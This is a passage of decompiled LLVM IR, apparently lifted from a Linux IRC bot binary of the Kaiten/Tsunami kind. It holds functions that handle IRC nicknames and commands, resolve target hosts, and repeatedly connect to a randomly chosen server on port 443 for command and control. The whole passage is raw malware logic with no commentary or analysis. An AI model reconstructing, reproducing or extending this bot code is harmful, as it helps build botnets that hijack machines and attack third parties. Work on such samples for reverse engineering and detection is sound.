  %stack_var_-20.0 = phi i8* [ %v22_804ab50, %dec_label_pc_804ab50 ], [ %stack_var_-20.172, %dec_label_pc_804ab56.preheader ]
  %v3_804ab6a = call i32 @_strlen(i8* %arg2)
  %v7_804ab71 = icmp ult i32 %stack_var_-28.0, %v3_804ab6a
  %v1_804ab73 = icmp eq i1 %v7_804ab71, false
  %.pre35 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_804ab73, label %dec_label_pc_804ab7f, label %dec_label_pc_804ab75

dec_label_pc_804ab75:                             ; preds = %dec_label_pc_804ab56
  %v2_804ab78 = load i8, i8* %stack_var_-20.0, align 1
  %v7_804ab7b = icmp eq i8 %v2_804ab78, 32
  %v1_804ab7d = icmp eq i1 %v7_804ab7b, false
  br i1 %v1_804ab7d, label %dec_label_pc_804ab50, label %dec_label_pc_804ab7f

dec_label_pc_804ab7f:                             ; preds = %dec_label_pc_804ab56, %dec_label_pc_804ab75
  %v5_804ab7f = add i32 %.pre35, 1
  %v3_804ab96 = call i32 @_strlen(i8* %arg2)
  %v4_804ab96 = mul i32 %v3_804ab96, -1
  %v1_804ab9c = sub i32 0, %v4_804ab96
  %v2_804ab9d = sub i32 0, %v4_804ab96
  %v12_804ab9d = icmp eq i32 %stack_var_-28.0, %v2_804ab9d
  br i1 %v12_804ab9d, label %dec_label_pc_804ad75, label %dec_label_pc_804aba5

dec_label_pc_804aba5:                             ; preds = %dec_label_pc_804ab7f
  %v22_804ab7f = inttoptr i32 %v5_804ab7f to i8*
  %v4_804aba5 = add nuw nsw i32 %storemerge1073, 1
  %v7_804abac = icmp sgt i32 %storemerge1073, 3
  br i1 %v7_804abac, label %dec_label_pc_804abba.preheader, label %dec_label_pc_804ab56.preheader

dec_label_pc_804ab56.preheader:                   ; preds = %entry, %dec_label_pc_804aba5
  %storemerge1073 = phi i32 [ 0, %entry ], [ %v4_804aba5, %dec_label_pc_804aba5 ]
  %stack_var_-20.172 = phi i8* [ %arg2, %entry ], [ %v22_804ab7f, %dec_label_pc_804aba5 ]
  %stack_var_-28.171 = phi i32 [ 0, %entry ], [ %stack_var_-28.0, %dec_label_pc_804aba5 ]
  br label %dec_label_pc_804ab56

dec_label_pc_804abba.preheader:                   ; preds = %dec_label_pc_804aba5
  br label %dec_label_pc_804abba

dec_label_pc_804abb7:                             ; preds = %dec_label_pc_804abd9
  %v4_804abb7 = add i32 %storemerge9, 1
  br label %dec_label_pc_804abba

dec_label_pc_804abba:                             ; preds = %dec_label_pc_804abba.preheader, %dec_label_pc_804abb7
  %storemerge9 = phi i32 [ %v4_804abb7, %dec_label_pc_804abb7 ], [ 0, %dec_label_pc_804abba.preheader ]
  %v3_804abce = call i32 @_strlen(i8* %v22_804ab7f)
  %v7_804abd5 = icmp ult i32 %storemerge9, %v3_804abce
  %v1_804abd7 = icmp eq i1 %v7_804abd5, false
  %.pre = add i32 %storemerge9, %v5_804ab7f
  br i1 %v1_804abd7, label %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge, label %dec_label_pc_804abd9

dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge: ; preds = %dec_label_pc_804abba
  %.pre24 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804abe6

dec_label_pc_804abd9:                             ; preds = %dec_label_pc_804abba
  %v1_804abdf = inttoptr i32 %.pre to i8*
  %v2_804abdf = load i8, i8* %v1_804abdf, align 1
  %v7_804abe2 = icmp eq i8 %v2_804abdf, 32
  %v1_804abe4 = icmp eq i1 %v7_804abe2, false
  br i1 %v1_804abe4, label %dec_label_pc_804abb7, label %dec_label_pc_804abe6

dec_label_pc_804abe6:                             ; preds = %dec_label_pc_804abd9, %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge
  %v1_804abec.pre-phi = phi i8* [ %.pre24, %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge ], [ %v1_804abdf, %dec_label_pc_804abd9 ]
  store i8 0, i8* %v1_804abec.pre-phi, align 1
  %v0_804abef = load i32, i32* @global_var_80678c4.101, align 4
  %v3_804abfe = call i32 @__GI_strcasecmp(i8* %v22_804ab7f, i32 %v0_804abef)
  %v1_804ac03 = icmp eq i32 %v3_804abfe, 0
  %v1_804ac05 = icmp eq i1 %v1_804ac03, false
  br i1 %v1_804ac05, label %dec_label_pc_804ad75, label %dec_label_pc_804ac0b

dec_label_pc_804ac0b:                             ; preds = %dec_label_pc_804abe6
  %v0_804ac0b = load i64, i64* @global_var_8062e2c.33, align 8
  %v1_804ac0b = trunc i64 %v0_804ac0b to i32
  %v1_804ac10 = icmp eq i32 %v1_804ac0b, 0
  %v1_804ac12 = icmp eq i1 %v1_804ac10, false
  br i1 %v1_804ac12, label %dec_label_pc_804ad75, label %dec_label_pc_804ac18

dec_label_pc_804ac18:                             ; preds = %dec_label_pc_804ac0b
  br label %dec_label_pc_804ac34.preheader

dec_label_pc_804ac2e:                             ; preds = %dec_label_pc_804ac53
  %v5_804ac2e = add i32 %.pre34, 1
  %v22_804ac2e = inttoptr i32 %v5_804ac2e to i8*
  %v4_804ac31 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_804ac34

dec_label_pc_804ac34:                             ; preds = %dec_label_pc_804ac34.preheader, %dec_label_pc_804ac2e
  %stack_var_-28.2 = phi i32 [ %v4_804ac31, %dec_label_pc_804ac2e ], [ %stack_var_-28.368, %dec_label_pc_804ac34.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_804ac2e, %dec_label_pc_804ac2e ], [ %stack_var_-20.369, %dec_label_pc_804ac34.preheader ]
  %v3_804ac48 = call i32 @_strlen(i8* %arg2)
  %v7_804ac4f = icmp ult i32 %stack_var_-28.2, %v3_804ac48
  %v1_804ac51 = icmp eq i1 %v7_804ac4f, false
  %.pre34 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_804ac51, label %dec_label_pc_804ac5d, label %dec_label_pc_804ac53

dec_label_pc_804ac53:                             ; preds = %dec_label_pc_804ac34
  %v2_804ac56 = load i8, i8* %stack_var_-20.2, align 1
  %v7_804ac59 = icmp eq i8 %v2_804ac56, 32
  %v1_804ac5b = icmp eq i1 %v7_804ac59, false
  br i1 %v1_804ac5b, label %dec_label_pc_804ac2e, label %dec_label_pc_804ac5d

dec_label_pc_804ac5d:                             ; preds = %dec_label_pc_804ac34, %dec_label_pc_804ac53
  %v5_804ac5d = add i32 %.pre34, 1
  %v3_804ac74 = call i32 @_strlen(i8* %arg2)
  %v4_804ac74 = mul i32 %v3_804ac74, -1
  %v1_804ac7a = sub i32 0, %v4_804ac74
  %v2_804ac7b = sub i32 0, %v4_804ac74
  %v12_804ac7b = icmp eq i32 %stack_var_-28.2, %v2_804ac7b
  br i1 %v12_804ac7b, label %dec_label_pc_804ad75, label %dec_label_pc_804ac83

dec_label_pc_804ac83:                             ; preds = %dec_label_pc_804ac5d
  %v22_804ac5d = inttoptr i32 %v5_804ac5d to i8*
  %v4_804ac83 = add nuw nsw i32 %storemerge870, 1
  %v7_804ac8a = icmp sgt i32 %storemerge870, 1
  br i1 %v7_804ac8a, label %dec_label_pc_804ac98.preheader, label %dec_label_pc_804ac34.preheader

dec_label_pc_804ac34.preheader:                   ; preds = %dec_label_pc_804ac18, %dec_label_pc_804ac83
  %storemerge870 = phi i32 [ 0, %dec_label_pc_804ac18 ], [ %v4_804ac83, %dec_label_pc_804ac83 ]
  %stack_var_-20.369 = phi i8* [ %arg2, %dec_label_pc_804ac18 ], [ %v22_804ac5d, %dec_label_pc_804ac83 ]
  %stack_var_-28.368 = phi i32 [ 0, %dec_label_pc_804ac18 ], [ %stack_var_-28.2, %dec_label_pc_804ac83 ]
  br label %dec_label_pc_804ac34

dec_label_pc_804ac98.preheader:                   ; preds = %dec_label_pc_804ac83
  br label %dec_label_pc_804ac98

dec_label_pc_804ac95:                             ; preds = %dec_label_pc_804acb7
  %v4_804ac95 = add i32 %storemerge, 1
  br label %dec_label_pc_804ac98

dec_label_pc_804ac98:                             ; preds = %dec_label_pc_804ac98.preheader, %dec_label_pc_804ac95
  %storemerge = phi i32 [ %v4_804ac95, %dec_label_pc_804ac95 ], [ 0, %dec_label_pc_804ac98.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804ac5d, i32* @edi, align 4
  %v3_804acac = call i32 @_strlen(i8* %v22_804ac5d)
  %v0_804acb3 = load i32, i32* @edx, align 4
  %v7_804acb3 = icmp ult i32 %v0_804acb3, %v3_804acac
  %v1_804acb5 = icmp eq i1 %v7_804acb3, false
  %.pre25 = add i32 %storemerge, %v5_804ac5d
  br i1 %v1_804acb5, label %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge, label %dec_label_pc_804acb7

dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge: ; preds = %dec_label_pc_804ac98
  %.pre32 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_804acc4

dec_label_pc_804acb7:                             ; preds = %dec_label_pc_804ac98
  %v1_804acbd = inttoptr i32 %.pre25 to i8*
  %v2_804acbd = load i8, i8* %v1_804acbd, align 1
  %v7_804acc0 = icmp eq i8 %v2_804acbd, 32
  %v1_804acc2 = icmp eq i1 %v7_804acc0, false
  br i1 %v1_804acc2, label %dec_label_pc_804ac95, label %dec_label_pc_804acc4

dec_label_pc_804acc4:                             ; preds = %dec_label_pc_804acb7, %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge
  %v1_804acca.pre-phi = phi i8* [ %.pre32, %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge ], [ %v1_804acbd, %dec_label_pc_804acb7 ]
  store i8 0, i8* %v1_804acca.pre-phi, align 1
  %v1_804acd3 = call i32 @inet_addr(i32 %v5_804ac5d)
  %v2_804acd3 = trunc i32 %v1_804acd3 to i8
  store i8 %v2_804acd3, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_804acd3, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804ace1 = icmp eq i1 %tmp, false
  br i1 %v1_804ace1, label %dec_label_pc_804acc4._crit_edge, label %dec_label_pc_804ace3

dec_label_pc_804acc4._crit_edge:                  ; preds = %dec_label_pc_804acc4
  br label %bb

dec_label_pc_804ace3:                             ; preds = %dec_label_pc_804acc4
  %v1_804ace9 = call i32 @__GI_gethostbyname(i32 %v5_804ac5d)
  %v4_804acf1 = icmp eq i32 %v1_804ace9, 0
  %v1_804acf5 = icmp eq i1 %v4_804acf1, false
  br i1 %v1_804acf5, label %dec_label_pc_804ad15, label %dec_label_pc_804acf7

dec_label_pc_804acf7:                             ; preds = %dec_label_pc_804ace3
  %v2_804ad0e = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_805b498.116 to i32))
  br label %dec_label_pc_804ad75

dec_label_pc_804ad15:                             ; preds = %dec_label_pc_804ace3
  %v1_804ad18 = add i32 %v1_804ace9, 12
  %v2_804ad18 = inttoptr i32 %v1_804ad18 to i32*
  %v3_804ad18 = load i32, i32* %v2_804ad18, align 4
  %v1_804ad20 = add i32 %v1_804ace9, 16
  %v2_804ad20 = inttoptr i32 %v1_804ad20 to i32*
  %v3_804ad20 = load i32, i32* %v2_804ad20, align 4
  %v1_804ad23 = inttoptr i32 %v3_804ad20 to i32*
  %v2_804ad23 = load i32, i32* %v1_804ad23, align 4
  %v1_804ad2a = inttoptr i32 %v2_804ad23 to i8*
  %v7_804ad2d = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_804ad2a, i32 %v3_804ad18)
  %v2_804ad3a.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_804acc4._crit_edge, %dec_label_pc_804ad15
  %v2_804ad3a = phi i8 [ %v2_804acd3, %dec_label_pc_804acc4._crit_edge ], [ %v2_804ad3a.pre, %dec_label_pc_804ad15 ]
  store i8 %v2_804ad3a, i8* bitcast (i8** @global_var_8062e2b.117 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_8062e28.32 to i8*), align 4
  store i64 256, i64* @global_var_8062e2c.33, align 8
  br label %dec_label_pc_804ad75

dec_label_pc_804ad75:                             ; preds = %dec_label_pc_804ab7f, %dec_label_pc_804ac5d, %dec_label_pc_804ac0b, %dec_label_pc_804abe6, %dec_label_pc_804acf7, %bb
  %v0_804ad7b = phi i32 [ %v1_804ac0b, %dec_label_pc_804ac0b ], [ %v3_804abfe, %dec_label_pc_804abe6 ], [ %v2_804ad0e, %dec_label_pc_804acf7 ], [ ptrtoint (i8** @global_var_8062e28.32 to i32), %bb ], [ %v1_804ac7a, %dec_label_pc_804ac5d ], [ %v1_804ab9c, %dec_label_pc_804ab7f ]
  ret i32 %v0_804ad7b

; uselistorder directives
  uselistorder i32 %.pre25, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge870, { 1, 0 }
  uselistorder i32 %v5_804ac5d, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0, 2 }
  uselistorder i32 %storemerge1073, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_8062e28.32, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i64* @global_var_8062e2c.33, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_804ad75, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_804ac98, { 1, 0 }
  uselistorder label %dec_label_pc_804ac34.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ac5d, { 1, 0 }
  uselistorder label %dec_label_pc_804abba, { 1, 0 }
  uselistorder label %dec_label_pc_804ab56.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ab7f, { 1, 0 }
}

define i32 @_433() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804ad7c = load i32, i32* @ebp, align 4
  store i32 %v0_804ad7c, i32* %stack_var_-4, align 4
  %v4_804ad7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ad7c, i32* @ebp, align 4
  %v0_804ad82 = load i32, i32* @global_var_80678c4.101, align 4
  %v1_804ad8a = call i32 @free(i32 %v0_804ad82)
  %v0_804ad8f = call i32 @makestring()
  store i32 %v0_804ad8f, i32* @global_var_80678c4.101, align 4
  ret i32 %v0_804ad8f

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_NICK(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %v4_804adb1 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804adae

dec_label_pc_804adab:                             ; preds = %dec_label_pc_804adcd
  %v4_804adab = add i32 %storemerge, 1
  br label %dec_label_pc_804adae

dec_label_pc_804adae:                             ; preds = %entry, %dec_label_pc_804adab
  %storemerge = phi i32 [ %v4_804adab, %dec_label_pc_804adab ], [ 0, %entry ]
  store i1 false, i1* @df, align 1
  store i32 %v4_804adb1, i32* @edi, align 4
  %v3_804adc2 = call i32 @_strlen(i8* %arg1)
  %v7_804adc9 = icmp ult i32 %storemerge, %v3_804adc2
  %v1_804adcb = icmp eq i1 %v7_804adc9, false
  %.pre = add i32 %storemerge, %v4_804adb1
  br i1 %v1_804adcb, label %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge, label %dec_label_pc_804adcd

dec_label_pc_804adae.dec_label_pc_804adda_crit_edge: ; preds = %dec_label_pc_804adae
  %.pre11 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804adda

dec_label_pc_804adcd:                             ; preds = %dec_label_pc_804adae
  %v1_804add3 = inttoptr i32 %.pre to i8*
  %v2_804add3 = load i8, i8* %v1_804add3, align 1
  %v10_804add6 = icmp eq i8 %v2_804add3, 33
  %v1_804add8 = icmp eq i1 %v10_804add6, false
  br i1 %v1_804add8, label %dec_label_pc_804adab, label %dec_label_pc_804adda

dec_label_pc_804adda:                             ; preds = %dec_label_pc_804adcd, %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge
  %v1_804ade0.pre-phi = phi i8* [ %.pre11, %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge ], [ %v1_804add3, %dec_label_pc_804adcd ]
  store i8 0, i8* %v1_804ade0.pre-phi, align 1
  %v0_804ade3 = load i32, i32* @global_var_80678c4.101, align 4
  %v3_804adf2 = call i32 @__GI_strcasecmp(i8* %arg1, i32 %v0_804ade3)
  %v1_804adf7 = icmp eq i32 %v3_804adf2, 0
  %v1_804adf9 = icmp eq i1 %v1_804adf7, false
  br i1 %v1_804adf9, label %dec_label_pc_804ae2e, label %dec_label_pc_804adfb

dec_label_pc_804adfb:                             ; preds = %dec_label_pc_804adda
  %v2_804adfe = load i8, i8* %tmp12, align 1
  %v10_804ae01 = icmp eq i8 %v2_804adfe, 58
  %v1_804ae03 = icmp eq i1 %v10_804ae01, false
  br i1 %v1_804ae03, label %dec_label_pc_804ae08, label %dec_label_pc_804ae05

dec_label_pc_804ae05:                             ; preds = %dec_label_pc_804adfb
  %v5_804ae05 = add i32 %arg2, 1
  %v22_804ae05 = inttoptr i32 %v5_804ae05 to i8*
  br label %dec_label_pc_804ae08

dec_label_pc_804ae08:                             ; preds = %dec_label_pc_804adfb, %dec_label_pc_804ae05
  %stack_var_12.0 = phi i8* [ %tmp12, %dec_label_pc_804adfb ], [ %v22_804ae05, %dec_label_pc_804ae05 ]
  %v0_804ae08 = load i32, i32* @global_var_80678c4.101, align 4
  %v1_804ae0d = icmp eq i32 %v0_804ae08, 0
  br i1 %v1_804ae0d, label %dec_label_pc_804ae1e, label %dec_label_pc_804ae11

dec_label_pc_804ae11:                             ; preds = %dec_label_pc_804ae08
  %v1_804ae19 = call i32 @free(i32 %v0_804ae08)
  br label %dec_label_pc_804ae1e

dec_label_pc_804ae1e:                             ; preds = %dec_label_pc_804ae08, %dec_label_pc_804ae11
  %v2_804ae24 = call i32 @__GI_strdup(i8* %stack_var_12.0)
  store i32 %v2_804ae24, i32* @global_var_80678c4.101, align 4
  br label %dec_label_pc_804ae2e

dec_label_pc_804ae2e:                             ; preds = %dec_label_pc_804adda, %dec_label_pc_804ae1e
  %v0_804ae33 = phi i32 [ %v3_804adf2, %dec_label_pc_804adda ], [ %v2_804ae24, %dec_label_pc_804ae1e ]
  ret i32 %v0_804ae33

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8 33, { 0, 1, 3, 2, 4 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ae2e, { 1, 0 }
  uselistorder label %dec_label_pc_804ae1e, { 1, 0 }
  uselistorder label %dec_label_pc_804ae08, { 1, 0 }
  uselistorder label %dec_label_pc_804adae, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ae34 = load i32, i32* @ebp, align 4
  store i32 %v0_804ae34, i32* %stack_var_-4, align 4
  %v4_804ae34 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ae34, i32* @ebp, align 4
  %v2_804af0a = ptrtoint i32* %stack_var_-32 to i32
  %v2_804af0d = ptrtoint i32* %stack_var_-28 to i32
  %v2_804af59 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_804ae3c

dec_label_pc_804ae3c:                             ; preds = %dec_label_pc_804ae3c.backedge, %entry
  store i32 -1, i32* @global_var_80678c8.28, align 8
  store i32 1, i32* %stack_var_-36, align 4
  %v0_804ae4d = load i32, i32* @global_var_8062e20.81, align 32
  %v1_804ae52 = icmp eq i32 %v0_804ae4d, 0
  %v1_804ae54 = icmp eq i1 %v1_804ae52, false
  br i1 %v1_804ae54, label %dec_label_pc_804ae79, label %dec_label_pc_804ae56

dec_label_pc_804ae56:                             ; preds = %dec_label_pc_804ae3c
  %v1_804ae56 = call i32 @random()
  %v0_804ae5d = load i64, i64* @global_var_805e5c0.120, align 8
  %sext = mul i64 %v0_804ae5d, 4294967296
  %v5_804ae62 = sdiv i64 %sext, 4294967296
  %v1_804ae67 = ashr i32 %v1_804ae56, 31
  %v6_804ae68 = zext i32 %v1_804ae56 to i64
  %v8_804ae68 = zext i32 %v1_804ae67 to i64
  %v9_804ae68 = mul nuw i64 %v8_804ae68, 4294967296
  %v10_804ae68 = or i64 %v9_804ae68, %v6_804ae68
  %v14_804ae68 = srem i64 %v10_804ae68, %v5_804ae62
  %v15_804ae68 = trunc i64 %v14_804ae68 to i32
  %v1_804ae6d = mul i32 %v15_804ae68, 4
  %v2_804ae6d = add i32 %v1_804ae6d, ptrtoint ([15 x i8]** @global_var_805e5c4.122 to i32)
  %v3_804ae6d = inttoptr i32 %v2_804ae6d to i32*
  %v4_804ae6d = load i32, i32* %v3_804ae6d, align 4
  store i32 %v4_804ae6d, i32* @global_var_80679e0.80, align 32
  br label %dec_label_pc_804ae79

dec_label_pc_804ae79:                             ; preds = %dec_label_pc_804ae3c, %dec_label_pc_804ae56
  store i32 0, i32* @global_var_8062e20.81, align 32
  br label %dec_label_pc_804ae83

dec_label_pc_804ae83:                             ; preds = %dec_label_pc_804ae83, %dec_label_pc_804ae79
  store i32 2, i32* %stack_var_-60, align 4
  %v3_804ae9a = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_804ae9a, i32* @global_var_80678c8.28, align 8
  %v2_804aea9 = icmp slt i32 %v3_804ae9a, 0
  br i1 %v2_804aea9, label %dec_label_pc_804ae83, label %dec_label_pc_804aead

dec_label_pc_804aead:                             ; preds = %dec_label_pc_804ae83
  %v0_804aead = load i32, i32* @global_var_80679e0.80, align 32
  store i32 %v0_804aead, i32* %stack_var_-60, align 4
  %v1_804aeb5 = call i32 @inet_addr(i32 %v0_804aead)
  %v1_804aeba = icmp eq i32 %v1_804aeb5, 0
  br i1 %v1_804aeba, label %dec_label_pc_804aed0, label %dec_label_pc_804aebe

dec_label_pc_804aebe:                             ; preds = %dec_label_pc_804aead
  %v0_804aebe = load i32, i32* @global_var_80679e0.80, align 32
  store i32 %v0_804aebe, i32* %stack_var_-60, align 4
  %v1_804aec6 = call i32 @inet_addr(i32 %v0_804aebe)
  %v10_804aecb = icmp eq i32 %v1_804aec6, -1
  %v1_804aece = icmp eq i1 %v10_804aecb, false
  br i1 %v1_804aece, label %dec_label_pc_804af2a, label %dec_label_pc_804aed0

dec_label_pc_804aed0:                             ; preds = %dec_label_pc_804aebe, %dec_label_pc_804aead
  %v0_804aed0 = load i32, i32* @global_var_80679e0.80, align 32
  store i32 %v0_804aed0, i32* %stack_var_-60, align 4
  %v1_804aed8 = call i32 @__GI_gethostbyname(i32 %v0_804aed0)
  %v4_804aee0 = icmp eq i32 %v1_804aed8, 0
  %v1_804aee4 = icmp eq i1 %v4_804aee0, false
  br i1 %v1_804aee4, label %dec_label_pc_804af02, label %dec_label_pc_804aee6

dec_label_pc_804aee6:                             ; preds = %dec_label_pc_804aed0
  store i32 0, i32* @global_var_80679e0.80, align 32
  %v0_804aef0 = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804aef0, i32* %stack_var_-60, align 4
  %v1_804aef8 = call i32 @close(i32 %v0_804aef0)
  br label %dec_label_pc_804ae3c.backedge

dec_label_pc_804ae3c.backedge:                    ; preds = %dec_label_pc_804aee6, %dec_label_pc_804b085
  br label %dec_label_pc_804ae3c

dec_label_pc_804af02:                             ; preds = %dec_label_pc_804aed0
  %v1_804af05 = add i32 %v1_804aed8, 12
  %v2_804af05 = inttoptr i32 %v1_804af05 to i32*
  %v3_804af05 = load i32, i32* %v2_804af05, align 4
  %v1_804af13 = add i32 %v1_804aed8, 16
  %v2_804af13 = inttoptr i32 %v1_804af13 to i32*
  %v3_804af13 = load i32, i32* %v2_804af13, align 4
  %v1_804af16 = inttoptr i32 %v3_804af13 to i32*
  %v2_804af16 = load i32, i32* %v1_804af16, align 4
  store i32 %v2_804af16, i32* %stack_var_-60, align 4
  %v3_804af23 = call i32 @bcopy(i32 %v2_804af16, i32 %v2_804af0d, i32 %v3_804af05)
  br label %dec_label_pc_804af3a

dec_label_pc_804af2a:                             ; preds = %dec_label_pc_804aebe
  %v0_804af2a = load i32, i32* @global_var_80679e0.80, align 32
  store i32 %v0_804af2a, i32* %stack_var_-60, align 4
  %v1_804af32 = call i32 @inet_addr(i32 %v0_804af2a)
  store i32 %v1_804af32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804af3a

dec_label_pc_804af3a:                             ; preds = %dec_label_pc_804af02, %dec_label_pc_804af2a
  store i32 2, i32* %stack_var_-32, align 4
  store i32 443, i32* %stack_var_-60, align 4
  %v2_804af47 = call i32 @htons(i16 443)
  %v0_804af53 = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804af53, i32* %stack_var_-60, align 4
  %v3_804af6b = call i32 @ioctl(i32 %v0_804af53, i32 21537, i32 %v2_804af59)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804af77 = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_804b06d

dec_label_pc_804af84:                             ; preds = %dec_label_pc_804b06d
  %v1_804af84 = call i32 @__errno_location(i32 %v2_804af77)
  %v1_804af89 = inttoptr i32 %v1_804af84 to i32*
  store i32 0, i32* %v1_804af89, align 4
  %v0_804af92 = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804af92, i32* %stack_var_-60, align 4
  %v3_804afa7 = call i32 @connect(i32 %v0_804af92, i32 %v2_804af0a, i32 16)
  %v1_804afac = icmp eq i32 %v3_804afa7, 0
  br i1 %v1_804afac, label %dec_label_pc_804afc0, label %dec_label_pc_804afb0

dec_label_pc_804afb0:                             ; preds = %dec_label_pc_804af84
  %v0_804afb0 = load i32, i32* %stack_var_-60, align 4
  %v1_804afb0 = call i32 @__errno_location(i32 %v0_804afb0)
  %v1_804afb5 = inttoptr i32 %v1_804afb0 to i32*
  %v2_804afb5 = load i32, i32* %v1_804afb5, align 4
  %v9_804afb7 = icmp eq i32 %v2_804afb5, 106
  %v1_804afba = icmp eq i1 %v9_804afb7, false
  br i1 %v1_804afba, label %dec_label_pc_804b049, label %dec_label_pc_804afc0

dec_label_pc_804afc0:                             ; preds = %dec_label_pc_804afb0, %dec_label_pc_804af84
  %v0_804afc0 = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804afc0, i32* %stack_var_-60, align 4
  %v5_804afe8 = call i32 @__GI_setsockopt(i32 %v0_804afc0, i32 1, i32 13, i32 0, i32 0)
  %v0_804afed = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804afed, i32* %stack_var_-60, align 4
  %v5_804b015 = call i32 @__GI_setsockopt(i32 %v0_804afed, i32 1, i32 2, i32 0, i32 0)
  %v0_804b01a = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804b01a, i32* %stack_var_-60, align 4
  %v5_804b042 = call i32 @__GI_setsockopt(i32 %v0_804b01a, i32 1, i32 9, i32 0, i32 0)
  %v2_804b0a1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b0a1, i32* @ebp, align 4
  ret i32 %v5_804b042

dec_label_pc_804b049:                             ; preds = %dec_label_pc_804afb0
  %v0_804b049 = load i32, i32* %stack_var_-60, align 4
  %v1_804b049 = call i32 @__errno_location(i32 %v0_804b049)
  %v1_804b04e = inttoptr i32 %v1_804b049 to i32*
  %v2_804b04e = load i32, i32* %v1_804b04e, align 4
  %v9_804b050 = icmp eq i32 %v2_804b04e, 115
  br i1 %v9_804b050, label %dec_label_pc_804b061, label %dec_label_pc_804b055

dec_label_pc_804b055:                             ; preds = %dec_label_pc_804b049
  %v0_804b055 = load i32, i32* %stack_var_-60, align 4
  %v1_804b055 = call i32 @__errno_location(i32 %v0_804b055)
  %v1_804b05a = inttoptr i32 %v1_804b055 to i32*
  %v2_804b05a = load i32, i32* %v1_804b05a, align 4
  %v9_804b05c = icmp eq i32 %v2_804b05a, 114
  %v1_804b05f = icmp eq i1 %v9_804b05c, false
  br i1 %v1_804b05f, label %dec_label_pc_804b085, label %dec_label_pc_804b061

dec_label_pc_804b061:                             ; preds = %dec_label_pc_804b055, %dec_label_pc_804b049
  store i32 1, i32* %stack_var_-60, align 4
  %v1_804b068 = call i32 @sleep(i32 1)
  br label %dec_label_pc_804b06d

dec_label_pc_804b06d:                             ; preds = %dec_label_pc_804af3a, %dec_label_pc_804b061
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804b074 = call i32 @__GI_time(i32* null)
  %v5_804b079 = sub i32 %v2_804b074, %v2_804af77
  %tmp = icmp ult i32 %v5_804b079, 10
  br i1 %tmp, label %dec_label_pc_804af84, label %dec_label_pc_804b085

dec_label_pc_804b085:                             ; preds = %dec_label_pc_804b055, %dec_label_pc_804b06d
  store i32 0, i32* @global_var_80679e0.80, align 32
  %v0_804b08f = load i32, i32* @global_var_80678c8.28, align 8
  store i32 %v0_804b08f, i32* %stack_var_-60, align 4
  %v1_804b097 = call i32 @close(i32 %v0_804b08f)
  br label %dec_label_pc_804ae3c.backedge

; uselistorder directives
  uselistorder i32 %v2_804af77, { 1, 0 }
